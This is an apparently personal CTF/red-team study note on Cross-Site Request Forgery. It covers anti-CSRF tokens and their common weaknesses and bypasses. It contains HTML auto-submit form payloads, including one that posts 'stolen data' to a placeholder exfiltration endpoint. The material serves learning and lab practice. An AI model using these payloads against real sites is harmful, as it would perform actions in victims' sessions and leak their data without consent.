# Cross-Site Request Forgery

[![introductiontowebapplications](../../../../_badges/htb/introductiontowebapplications.svg)](https://academy.hackthebox.com/course/preview/introduction-to-web-applications)
[![session_security](../../../../_badges/htb/session_security.svg)](https://academy.hackthebox.com/course/preview/session-security)
[![cross-site_request_forgery_prevention](../../../../_badges/owasp/cross-site_request_forgery_prevention.svg)](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
[![csrf_injection](../../../../_badges/poat/csrf_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
[![csrf_0_protection](../../../../_badges/rootme/web_client/csrf_0_protection.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection)
[![csp_bypass_inline_code](../../../../_badges/rootme/web_client/csp_bypass_inline_code.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)
[![csp_bypass_jsonp](../../../../_badges/rootme/web_client/csp_bypass_jsonp.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)
[![samcms](../../../../_badges/rootme/realist/samcms.svg)](https://www.root-me.org/en/Challenges/Realist/SamCMS)

<div class="row row-cols-lg-2"><div>

Fundamentally, Cross-Site Request Forgery (CSRF) refers to using the session of a user logged to a website to perform API calls without their consent. For instance, an API call to modify their password.

If a cookie was set with `SameSite: None` which is not the default, it can be accessed and exploited from any site.

Many modern browsers have built-in anti-CSRF measures, such as with the `Content-Security-Policy` header ([refer to CSP](files/csp.md)).

[XSS](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md) is a common attack technique to perform a CSRF attack, by injecting a form that automatically submit itself.

ðŸ“š During CTFs, it may take between one and five minutes.
</div><div>

You can find payloads on [PayloadsAllTheThings/CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection). You can test the payload with a [HTTP Requests Grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) first during CTFs.

```html!
<form id="autosubmit" action="https://<target_form_URL>" method="post">
  <input type="text" name="xxx" value="yyy" hidden>
  <button type="submit">Submit</button>
</form>
<script>
 document.getElementById("autosubmit").submit();
</script>
```

```html!
<form id="fdata" action="//refer/to/stealing/cookies" method="POST">
<input type="hidden" id="data" name="data" value="nop" />
<input type="submit" value="Submit" />
</form>
<script defer>
document.getElementById('data').value='stolen data';
document.getElementById('fdata').submit();
</script>
```
</div></div>

<hr class="sep-both">

## Anti-CSRF Token

[![sqlmapessentials](../../../../_badges/htb/sqlmapessentials.svg)](https://academy.hackthebox.com/course/preview/sqlmap-essentials)
[![session_security](../../../../_badges/htb/session_security.svg)](https://academy.hackthebox.com/course/preview/session-security)
[![gitlabcve20237028](../../../../_badges/thm-p/gitlabcve20237028.svg)](https://tryhackme.com/r/room/gitlabcve20237028)
[![unbakedpie](../../../../_badges/thm-p/unbakedpie.svg)](https://tryhackme.com/r/room/unbakedpie)

<div class="row row-cols-lg-2"><div>

Some websites have a CSRF token, mostly attached to HTML forms, as a form of protection against CSRF attacks and other automation tools.

It's a generated value that is added to the form, often as a hidden HTML `<input>` field. It proves that someone submitting a form effectively visited the page with the form beforehand.

CSRF tokens should be randomly generated. Do not use `md5(username)` or similar guessable token generation functions.

Many tools have built-in switches to handle/bypass such forms.
</div><div>

A few other inappropriate settings

* The server only checks if the header is present
* The server only checks if the length of the token
* The server only checks the token if it was sent
* We can use someone else's CSRF token
* We can reuse a CSRF token
* Verb tampering may bypass CSRF verification

There is also the [Double-Submit Cookie Pattern](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#alternative-using-a-double-submit-cookie-pattern) but it can be bypassed by giving an arbitrary value to both the cookie and the header.
</div></div>

<hr class="sep-both">

## Additional Payloads

<div class="row row-cols-lg-2"><div>

Login form

```html!
<form id="autosubmit" action="URL" method="post">
<input name="username" value="toto">
<input name="password" value="toto">
<button type="submit" class="btn btn-default">Submit</button>
</form>
```
</div><div>
</div></div>